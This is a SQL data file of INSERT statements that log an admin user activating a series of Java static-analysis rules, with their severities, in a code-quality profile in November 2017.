INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (645, '2017-11-20 07:28:36.118', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC0WbbGRdfPp-qno');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (646, '2017-11-20 07:28:36.199', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC1nbbGRdfPp-qnp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (647, '2017-11-20 07:28:36.302', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC3NbbGRdfPp-qnq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (648, '2017-11-20 07:28:36.402', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC4ybbGRdfPp-qnr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (649, '2017-11-20 07:28:36.457', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC5pbbGRdfPp-qns');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (650, '2017-11-20 07:28:36.507', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC6bbbGRdfPp-qnt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (651, '2017-11-20 07:28:36.561', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC7RbbGRdfPp-qnu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (652, '2017-11-20 07:28:36.595', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC7zbbGRdfPp-qnv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (653, '2017-11-20 07:28:36.645', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC8lbbGRdfPp-qnw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (654, '2017-11-20 07:28:36.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC9VbbGRdfPp-qnx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (655, '2017-11-20 07:28:36.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC92bbGRdfPp-qny');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (656, '2017-11-20 07:28:36.761', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC-ZbbGRdfPp-qnz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (657, '2017-11-20 07:28:36.811', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC_LbbGRdfPp-qn0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (658, '2017-11-20 07:28:36.858', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVC_6bbGRdfPp-qn1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (659, '2017-11-20 07:28:36.912', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDAwbbGRdfPp-qn2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (660, '2017-11-20 07:28:37.005', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDCNbbGRdfPp-qn3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (661, '2017-11-20 07:28:37.041', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDCxbbGRdfPp-qn4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (662, '2017-11-20 07:28:37.087', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDDfbbGRdfPp-qn5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (663, '2017-11-20 07:28:37.138', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDESbbGRdfPp-qn6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (664, '2017-11-20 07:28:37.171', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDEzbbGRdfPp-qn7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (665, '2017-11-20 07:28:37.223', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDFnbbGRdfPp-qn8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (666, '2017-11-20 07:28:37.266', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDGSbbGRdfPp-qn9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (667, '2017-11-20 07:28:37.316', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDHEbbGRdfPp-qn-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (668, '2017-11-20 07:28:37.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDHfbbGRdfPp-qn_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (669, '2017-11-20 07:28:37.39', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDIObbGRdfPp-qoA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (670, '2017-11-20 07:28:37.436', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDI8bbGRdfPp-qoB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (671, '2017-11-20 07:28:37.49', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDJybbGRdfPp-qoC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (672, '2017-11-20 07:28:37.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDKnbbGRdfPp-qoD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (673, '2017-11-20 07:28:37.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDLcbbGRdfPp-qoE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (674, '2017-11-20 07:28:37.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDMRbbGRdfPp-qoF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (675, '2017-11-20 07:28:37.723', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDNbbbGRdfPp-qoG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (676, '2017-11-20 07:28:37.754', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDN6bbGRdfPp-qoH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (677, '2017-11-20 07:28:37.785', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDOZbbGRdfPp-qoI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (678, '2017-11-20 07:28:37.837', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDPNbbGRdfPp-qoJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (679, '2017-11-20 07:28:37.877', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDP1bbGRdfPp-qoK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (680, '2017-11-20 07:28:37.913', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDQZbbGRdfPp-qoL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (681, '2017-11-20 07:28:37.955', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDRDbbGRdfPp-qoM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (682, '2017-11-20 07:28:38.105', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDTZbbGRdfPp-qoN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (683, '2017-11-20 07:28:38.214', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDVGbbGRdfPp-qoO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (684, '2017-11-20 07:28:38.272', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDWAbbGRdfPp-qoP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (685, '2017-11-20 07:28:38.49', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDZabbGRdfPp-qoQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (686, '2017-11-20 07:28:38.593', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDbBbbGRdfPp-qoR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (687, '2017-11-20 07:28:38.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDcPbbGRdfPp-qoS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (688, '2017-11-20 07:28:38.739', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDdTbbGRdfPp-qoT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (689, '2017-11-20 07:28:38.783', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDd_bbGRdfPp-qoU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (690, '2017-11-20 07:28:38.83', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDeubbGRdfPp-qoV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (691, '2017-11-20 07:28:38.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDfabbGRdfPp-qoW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (692, '2017-11-20 07:28:38.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDgHbbGRdfPp-qoX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (693, '2017-11-20 07:28:38.964', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDg0bbGRdfPp-qoY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (694, '2017-11-20 07:28:39.019', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDhrbbGRdfPp-qoZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (695, '2017-11-20 07:28:39.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDi2bbGRdfPp-qoa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (696, '2017-11-20 07:28:39.126', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDjWbbGRdfPp-qob');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (697, '2017-11-20 07:28:39.166', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDj-bbGRdfPp-qoc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (698, '2017-11-20 07:28:39.196', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDkcbbGRdfPp-qod');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (699, '2017-11-20 07:28:39.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDlCbbGRdfPp-qoe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (700, '2017-11-20 07:28:39.263', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDlfbbGRdfPp-qof');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (701, '2017-11-20 07:28:39.296', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDmAbbGRdfPp-qog');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (702, '2017-11-20 07:28:39.332', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDmkbbGRdfPp-qoh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (703, '2017-11-20 07:28:39.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDnDbbGRdfPp-qoi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (704, '2017-11-20 07:28:39.395', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDnjbbGRdfPp-qoj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (705, '2017-11-20 07:28:39.428', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDoEbbGRdfPp-qok');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (706, '2017-11-20 07:28:39.472', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDowbbGRdfPp-qol');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (707, '2017-11-20 07:28:39.521', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDphbbGRdfPp-qom');
